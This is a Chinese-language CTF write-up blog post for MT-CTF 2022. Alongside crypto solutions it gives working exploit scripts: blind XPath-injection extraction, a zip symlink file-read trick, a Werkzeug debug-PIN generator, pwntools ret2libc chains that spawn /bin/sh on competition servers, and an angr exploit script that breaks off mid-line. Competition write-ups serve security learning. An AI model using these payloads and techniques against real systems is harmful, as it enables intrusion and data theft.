<p><img src="/2022/09/MT-CTF-Writeup/xB5nlju1bu47FibXGyotBw.png" alt="x"></p>
<h2 id="解题情况"><a class="markdownIt-Anchor" href="#解题情况"></a> <strong>解题情况：</strong></h2>
<p><img src="/2022/09/MT-CTF-Writeup/ezFtSI_DXc66SQ4rsGdDiw.png" alt="2"></p>
<h2 id="解题过程"><a class="markdownIt-Anchor" href="#解题过程"></a> 解题过程</h2>
<h3 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> <strong>Crypto</strong></h3>
<h4 id="strange_rsa1"><a class="markdownIt-Anchor" href="#strange_rsa1"></a> <strong>strange_rsa1</strong></h4>
<p>在给定的实数域上求根，然后转整数得到q，解RSA即可。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">e = 0x10001</span><br><span class="line">n = 108525167048069618588175976867846563247592681279699764935868571805537995466244621039138584734968186962015154069834228913223982840558626369903697856981515674800664445719963249384904839446749699482532818680540192673814671582032905573381188420997231842144989027400106624744146739238687818312012920530048166672413</span><br><span class="line">c = 23970397560482326418544500895982564794681055333385186829686707802322923345863102521635786012870368948010933275558746273559080917607938457905967618777124428711098087525967347923209347190956512520350806766416108324895660243364661936801627882577951784569589707943966009295758316967368650512558923594173887431924</span><br><span class="line">gift = 0.9878713210057139023298389025767652308503013961919282440169053652488565206963320721234736480911437918373201299590078678742136736290349578719187645145615363088975706222696090029443619975380433122746296316430693294386663490221891787292112964989501856435389725149610724585156154688515007983846599924478524442938</span><br><span class="line"></span><br><span class="line"><span class="attribute">F</span>=RealField(prec=512*2)</span><br><span class="line">R.&lt;x&gt;=PolynomialRing(F)</span><br><span class="line"><span class="attribute">f</span>=x*x*gift-n</span><br><span class="line"><span class="attribute">r</span>=f.roots()[0][0]</span><br><span class="line"><span class="attribute">q</span>=int(abs(r))</span><br><span class="line"><span class="comment">#q=10481297369477678688647473426264404751672609241332968992310058598922120259940804922095197051670288498112926299671514217457279033970326518832408003060034369</span></span><br><span class="line"><span class="attribute">p</span>=n//q</span><br><span class="line"><span class="attribute">d</span>=inverse(e,(p-1)*(q-1))</span><br><span class="line"><span class="attribute">m</span>=pow(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;a5537b232c1ab750e0db61ec352504a301b7b212&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h4 id="strange_rsa2"><a class="markdownIt-Anchor" href="#strange_rsa2"></a> <strong>strange_rsa2</strong></h4>
<p>注意这题用到了上题的flag。</p>
<p>给出了两个随机多项式，我的想法是构造二元多项式，用grobner基求出a。由于模数p未知，先用n替代。然而解完惊奇地发现顺带把p直接规约出来了，属于是意外收获了。后面解RSA就OK了。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">def my_poly(coe,x):</span><br><span class="line">	<span class="attribute">res</span>=0</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(1,513):</span><br><span class="line">		res+=coe[i-1]*(x^i)</span><br><span class="line">	return res</span><br><span class="line"></span><br><span class="line">e = 0x10001</span><br><span class="line">flag1 = b<span class="string">&#x27;flag&#123;a5537b232c1ab750e0db61ec352504a301b7b212&#125;&#x27;</span></span><br><span class="line">k = bytes_to_long(flag1)</span><br><span class="line">exec(open(<span class="string">&#x27;output.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read())</span><br><span class="line">R.&lt;a,t&gt;=PolynomialRing(Zmod(n))</span><br><span class="line"><span class="attribute">s1</span>=gift[0][0]</span><br><span class="line"><span class="attribute">coe1</span>=gift[0][1:]</span><br><span class="line"><span class="attribute">s2</span>=gift[1][0]</span><br><span class="line"><span class="attribute">coe2</span>=gift[1][1:]</span><br><span class="line"><span class="attribute">f1</span>=my_poly(coe1,a)+s1</span><br><span class="line"><span class="attribute">f2</span>=my_poly(coe2,t)+s2</span><br><span class="line"></span><br><span class="line"><span class="attribute">res</span>=Ideal([f1,f2,t-k<span class="number">*a</span>]).groebner_basis()</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line">res=[ x.constant_coefficient() <span class="keyword">for</span> x <span class="keyword">in</span> res]</span><br><span class="line">a,t,<span class="attribute">p</span>=list(map(int,res))</span><br><span class="line"><span class="built_in">print</span>(a,t,p)</span><br><span class="line"><span class="attribute">q</span>=n//p</span><br><span class="line"><span class="attribute">d</span>=inverse(e,(p-1)*(q-1))</span><br><span class="line"><span class="attribute">m</span>=pow(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(int(m)))</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;e6d7511d75bd537e1bd0cd08abea415f5f27d6cf&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="web"><a class="markdownIt-Anchor" href="#web"></a> <strong>Web</strong></h3>
<h4 id="babyjava"><a class="markdownIt-Anchor" href="#babyjava"></a> <strong>babyjava</strong></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://eci-2ze39yqy7j0c006fv94i.cloudeci1.ichunqiu.com:8888/hello&quot;</span></span><br><span class="line">strs =<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_&#123;&#125;-@!&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">payload1=<span class="string">&quot;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27; &quot;</span></span><br><span class="line">payload2=<span class="string">&quot;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27; &quot;</span></span><br><span class="line">payload3=<span class="string">&quot;&#x27;or substring(name(/root/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27; &quot;</span> <span class="comment">#username username</span></span><br><span class="line"><span class="comment">#&#x27;or string-length(name(/root/user/username[2]))=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;</span></span><br><span class="line">payload4=<span class="string">&quot;&#x27;or substring(/root/user/username[2]/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27; &quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">        data=&#123;<span class="string">&quot;xpath&quot;</span>:payload4.<span class="built_in">format</span>(i,j)&#125;</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;This information is not available&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j==<span class="string">&quot;!&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="comment"># if &quot;This information is not available&quot; in r.text:</span></span><br><span class="line">        <span class="comment">#     print(flag)</span></span><br><span class="line">        <span class="comment">#     break</span></span><br></pre></td></tr></table></figure>
<p>xpath注入，flag在user的第二个username里</p>
<p><img src="/2022/09/MT-CTF-Writeup/Yhut2UBDdjhU1HRdsrIkJQ.png" alt="3"></p>
<h4 id="onlineuzip"><a class="markdownIt-Anchor" href="#onlineuzip"></a> <strong>OnlineUzip</strong></h4>
<p>文件上传存在软链接任意文件读取</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">ln -s / <span class="keyword">test</span></span><br><span class="line"><span class="keyword">zip</span> -y <span class="keyword">test</span>.<span class="keyword">zip</span> <span class="keyword">test</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/09/MT-CTF-Writeup/MqA7vFiNYqVxVBxCUaSVOg.png" alt="4"></p>
<p>flag文件没有权限，但是报错了，尝试去还原pin</p>
<p><img src="/2022/09/MT-CTF-Writeup/vK2D2uEAIPF8eUlvvjO1Ww.png" alt="5"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;ctf&#x27;</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;95530260679&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;96cec10d3d9307792745ec3b85c8962029821f34fdecf5402e3da60b23c2cfc8a0b98c91124624fa89bfc7f4950ef9f5&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
<p>然后进入直接执行python命令读取flag</p>
<p><img src="/2022/09/MT-CTF-Writeup/NIj_m3ePomvNmqnedYKJqw.png" alt="6"></p>
<h3 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> <strong>PWN</strong></h3>
<h4 id="note"><a class="markdownIt-Anchor" href="#note"></a> <strong>note</strong></h4>
<p>edit存在越界编辑，可以直接ret2libc。</p>
<p><img src="/2022/09/MT-CTF-Writeup/9GVF4sWsMZTpZTzVsU4WCA.png" alt="7"></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"><span class="attribute">r</span>=process(&quot;/home/ubuntu/pwn/比赛/MTCTF/note/note&quot;)</span><br><span class="line"><span class="attribute">r</span>=remote(&quot;39.106.78.22&quot;,35482)</span><br><span class="line"><span class="attribute">elf</span>=ELF(&quot;/home/ubuntu/pwn/比赛/MTCTF/note/note&quot;)</span><br><span class="line"><span class="attribute">libc</span>=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">context(<span class="attribute">arch</span>=<span class="string">&quot;amd64&quot;</span>,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span><br><span class="line">context.terminal = [<span class="string">&#x27;terminator&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">def meau(index):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;5. leave&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(size,content):</span><br><span class="line">    meau(1)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Size: &quot;</span>,str(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    meau(2)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">edit</span>(index,content):</span><br><span class="line">    meau(3)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line">    r.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    meau(4)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="attribute">puts_plt</span>=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="attribute">puts_got</span>=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = 0x401150</span><br><span class="line">pop_rdi_ret = 0x00000000004017b3</span><br><span class="line">ret = 0x000000000040101a</span><br><span class="line"><span class="built_in">add</span>(0x100,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload = b<span class="string">&#x27;a&#x27;</span><span class="number">*8</span> + p64(pop_rdi_ret) +p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class="line"><span class="built_in">edit</span>(-4,payload)</span><br><span class="line"><span class="attribute">libc_base</span>=u64(r.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b<span class="string">&quot;\x00&quot;</span>)) - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base+libc.search(b<span class="string">&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">payload = b<span class="string">&#x27;a&#x27;</span><span class="number">*8</span> + p64(ret)+p64(pop_rdi_ret) +p64(bin_sh)+p64(system_addr)+p64(start_addr)</span><br><span class="line"><span class="built_in">edit</span>(-4,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="ret2libc_aarch64"><a class="markdownIt-Anchor" href="#ret2libc_aarch64"></a> <strong>ret2libc_aarch64</strong></h4>
<p>异构pwn，可以直接泄露出libc数据，然后直接根据aarch64的调用规则，调用system(“/bin/sh”)。</p>
<p><img src="/2022/09/MT-CTF-Writeup/K5J0v8JuNuVU0KNm3B0IGA.png" alt="8"></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"></span><br><span class="line">context(<span class="attribute">arch</span>=<span class="string">&quot;aarch64&quot;</span>,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">local = 2</span><br><span class="line"><span class="keyword">if</span> local == 0:</span><br><span class="line">    <span class="attribute">r</span>=process(argv=[<span class="string">&#x27;qemu-aarch64&#x27;</span>,<span class="string">&#x27;-g&#x27;</span>,<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/home/ubuntu/pwn/arm_pwn/pwn&#x27;</span>,<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> local == 1:</span><br><span class="line">    <span class="attribute">r</span>=process(argv=[<span class="string">&#x27;qemu-aarch64&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/home/ubuntu/pwn/arm_pwn/pwn&#x27;</span>,<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="attribute">r</span>=remote(&quot;39.106.78.22&quot;,16078)</span><br><span class="line"></span><br><span class="line"><span class="attribute">elf</span>=ELF(&quot;./pwn&quot;)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/ubuntu/pwn/arm_pwn/pwn/lib/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">def meau(index):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">meau(1)</span><br><span class="line"><span class="attribute">setbuf_got</span>=elf.got[<span class="string">&#x27;setbuf&#x27;</span>]</span><br><span class="line">r.send(p64(setbuf_got))</span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&gt;\n&quot;</span>)</span><br><span class="line">libc_base = u64(r.recvuntil(b<span class="string">&quot;\n&quot;</span>)[:-1].ljust(8,b<span class="string">&#x27;\x00&#x27;</span>)) - libc.symbols[<span class="string">&#x27;setbuf&#x27;</span>] + 0x4000000000</span><br><span class="line">success(<span class="string">&quot;libc_base = &quot;</span>+hex(libc_base))</span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">bin_sh = libc_base + libc.search(b<span class="string">&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">meau(2)</span><br><span class="line"><span class="attribute">payload</span>=b&#x27;a&#x27;*0x88+p64(libc_base+0x0000000000063e5c)+p64(system_addr)*5+p64(bin_sh)+p64(system_addr)*5</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="捉迷藏"><a class="markdownIt-Anchor" href="#捉迷藏"></a> <strong>捉迷藏</strong></h4>
<p>就是把SCTF的一道自动化题目的一种情况拿了过来，之前的脚本改改就能直接打。</p>
<p><img src="/2022/09/MT-CTF-Writeup/LINGgj13umO_LKwO4910kQ.png" alt="9"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">from</span> angr.sim_options <span class="keyword">import</span> LAZY_SOLVES</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">from</span> angr.sim_options <span class="keyword">import</span> ZERO_FILL_UNCONSTRAINED_MEMORY, unicorn</span><br><span class="line"><span class="keyword">from</span> angr <span class="keyword">import</span> Project, SimProcedure</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NopsFun</span>(<span class="title class_ inherited__">SimProcedure</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;skip&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">out_list = []</span><br><span class="line">g_idx = <span class="number">0</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">fksth</span>(<span class="title class_ inherited__">SimProcedure</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, a1, a2</span>):</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;fksth&#x27;</span>)</span><br><span class="line">        constraints = []</span><br><span class="line">        idx = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            v = self.state.memory.load(a2+idx, <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> self.state.solver.<span class="built_in">eval</span>(v) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            constraints.append(v == self.state.memory.load(a1+idx, <span class="number">1</span>))</span><br><span class="line">            idx += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        retval = claripy.If(self.state.solver.And(*constraints), claripy.BVV(<span class="number">0</span>, <span class="number">64</span>), claripy.BVV(<span class="number">1</span>, <span class="number">64</span>))</span><br><span class="line">        <span class="keyword">return</span> retval</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">input_val</span>(<span class="title class_ inherited__">SimProcedure</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">global</span> g_idx</span><br><span class="line">        data1 = claripy.BVS(<span class="string">&#x27;input%x&#x27;</span> %g_idx, <span class="number">32</span>)</span><br><span class="line">        data2 = claripy.BVV(<span class="number">0</span>, <span class="number">32</span>)</span><br><span class="line">        ret = self.state.solver.Concat(data2, data1)</span><br><span class="line">        out_list.append((g_idx, <span class="string">&#x27;int&#x27;</span>, data1))</span><br><span class="line">        g_idx += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">input_line</span>(<span class="title class_ inherited__">SimProcedure</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, buff, <span class="built_in">len</span></span>):</span><br><span class="line">        <span class="keyword">global</span> g_idx</span><br><span class="line">        <span class="built_in">len</span>= self.state.solver.<span class="built_in">eval</span>(<span class="built_in">len</span>)</span><br><span class="line">        data = claripy.BVS(<span class="string">&#x27;input%x&#x27;</span> %g_idx, <span class="built_in">len</span>* <span class="number">8</span>)</span><br><span class="line">        out_list.append((g_idx, <span class="string">&#x27;str&#x27;</span>, data))</span><br><span class="line">        g_idx += <span class="number">1</span></span><br><span class="line">        self.state.memory.store(buff, data)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aeg</span>(<span class="params">binary</span>):</span><br><span class="line">    p = angr.Project(binary, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>:<span class="literal">False</span>, <span class="string">&#x27;load_debug_info&#x27;</span>: <span class="literal">True</span>&#125;)</span><br><span class="line">    <span class="keyword">for</span> symbol <span class="keyword">in</span> p.loader.symbols:</span><br><span class="line">        <span class="comment">#print (symbol.name)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;main&#x27;</span> == symbol.name:</span><br><span class="line">            main_addr = symbol.rebased_addr</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;main=%x\n&#x27;</span> %main_addr)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;fksth&#x27;</span> <span class="keyword">in</span> symbol.name:</span><br><span class="line">            fksth_addr = symbol.rebased_addr</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;init&#x27;</span> <span class="keyword">in</span> symbol.name:</span><br><span class="line">            init_addr = symbol.rebased_addr</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;input_line&#x27;</span> <span class="keyword">in</span> symbol.name:</span><br><span class="line">            input_line_addr = symbol.rebased_addr</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;input_val&#x27;</span> <span class="keyword">in</span> symbol.name:</span><br><span class="line">            input_val_addr = symbol.rebased_addr</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;backdoor&#x27;</span> <span class="keyword">in</span> symbol.name:</span><br><span class="line">            backdoor_addr = symbol.rebased_addr</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;symbol=%s, addr=%x&#x27;</span> %(symbol.name, symbol.rebased_addr))</span><br><span class="line"></span><br><span class="line">    cfg = p.analyses.CFGFast()</span><br><span class="line">    main_func = cfg.kb.functions[main_addr]</span><br><span class="line">    main_block_addrs = main_func.block_addrs</span><br><span class="line">    </span><br><span class="line">    max_disp = -<span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">for</span> call_site <span class="keyword">in</span> main_func.get_call_sites():</span><br><span class="line">        target = main_func.get_call_target(call_site)</span><br><span class="line">        <span class="keyword">if</span> target == input_line_addr:</span><br><span class="line">            <span class="comment">#拿出对应的input_line代码块</span></span><br><span class="line">            block = p.factory.block(call_site).capstone</span><br><span class="line">            <span class="keyword">for</span> insn <span class="keyword">in</span> block.insns:</span><br><span class="line">                <span class="built_in">print</span> (insn)</span><br><span class="line">                <span class="keyword">if</span> insn.mnemonic == <span class="string">&#x27;lea&#x27;</span>:</span><br><span class="line">                    <span class="keyword">if</span> insn.disp &gt; max_disp:</span><br><span class="line">                        max_disp = insn.disp</span><br><span class="line">                        vul_addr = call_site</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (max_disp)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;addr=%x&#x27;</span> %vul_addr)</span><br><span class="line">    graph = main_func.transition_graph</span><br><span class="line">    <span class="keyword">for</span> block_node <span class="keyword">in</span> graph.nodes:</span><br><span class="line">        <span class="keyword">if</span> (block_node.addr &lt;= vul_addr) &amp; (vul_addr &lt; (block_node.addr+block_node.size)):</span><br><span class="line">            vul_block = block_node</span><br><span class="line">    cur_block = vul_block</span><br><span class="line"></span><br><span class="line">    path = [cur_block.addr]</span><br><span class="line">    <span class="keyword">while</span> cur_block.addr != main_addr:</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> graph.predecessors(cur_block):</span><br><span class="line">            cur_block = key</span><br><span class="line">            path = [cur_block.addr] + path</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    void_addrs = []</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> graph.nodes:</span><br><span class="line">        <span class="keyword">if</span> node.addr <span class="keyword">not</span> <span class="keyword">in</span> path:</span><br><span class="line">            <span class="keyword">if</span> node.addr <span class="keyword">in</span> main_block_addrs:</span><br><span class="line">                void_addrs.append(node.addr)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;-&#x27;</span>.join(<span class="string">&#x27;0x%x&#x27;</span> %p <span class="keyword">for</span> p <span class="keyword">in</span> path))</span><br><span class="line">        </span><br><span class="line">    state = p.factory.blank_state(addr=main_addr, add_options=&#123;LAZY_SOLVES&#125;)</span><br><span class="line">    state.options.add(ZERO_FILL_UNCONSTRAINED_MEMORY)</span><br><span class="line">    state.options.add(LAZY_SOLVES)</span><br><span class="line">    simgr = p.factory.simgr(state)</span><br><span class="line">    print_plt = p.loader.main_object.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">    p.hook(print_plt, NopsFun())</span><br><span class="line">    p.hook(fksth_addr, fksth())</span><br><span class="line">    p.hook(init_addr, NopsFun())</span><br><span class="line">    p.hook(input_line_addr, input_line())</span><br><span class="line">    p.hook(input_val_addr, input_val())</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">log_state</span>(<span class="params">simgr</span>):</span><br><span class="line">        <span class="keyword">for</span> state <span class="keyword">in</span> simgr.active:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;pc=%s&#x27;</span> %state.regs.pc)</span><br><span class="line">            <span class="keyword">if</span> state.solver.<span class="built_in">eval</span>(state.regs.pc) <span class="keyword">in</span> void_addrs:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&#x27;remove&#x27;</span>)</span><br><span class="line">                simgr.stashes[<span class="string">&#x27;active&#x27;</span>].remove(state)</span><br><span class="line">            <span class="keyword">if</span> state.solver.<span class="built_in">eval</span>(state.regs.pc) == vul_block.addr:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&#x27;found&#x27;</span>)</span><br><span class="line">                simgr.stashes[<span class="string">&#x27;found&#x27;</span>].append(state)</span><br><span class="line">                simgr.stashes[<span class="string">&#x27;active&#x27;</span>].remove(state)</span><br><span class="line">        <span class="keyword">return</span> simgr</span><br><span class="line"></span><br><span class="line">    simgr.explore(step_func=log_state)</span><br><span class="line">    state = simgr.stashes[<span class="string">&#x27;found&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    s = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> (idx, <span class="built_in">type</span>, data) <span class="keyword">in</span> out_list:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&#x27;int&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;%x: %s&#x27;</span> %(idx, state.solver.<span class="built_in">eval</span>(data)))</span><br><span class="line">            s += <span class="string">b&#x27;%d &#x27;</span> %(state.solver.<span 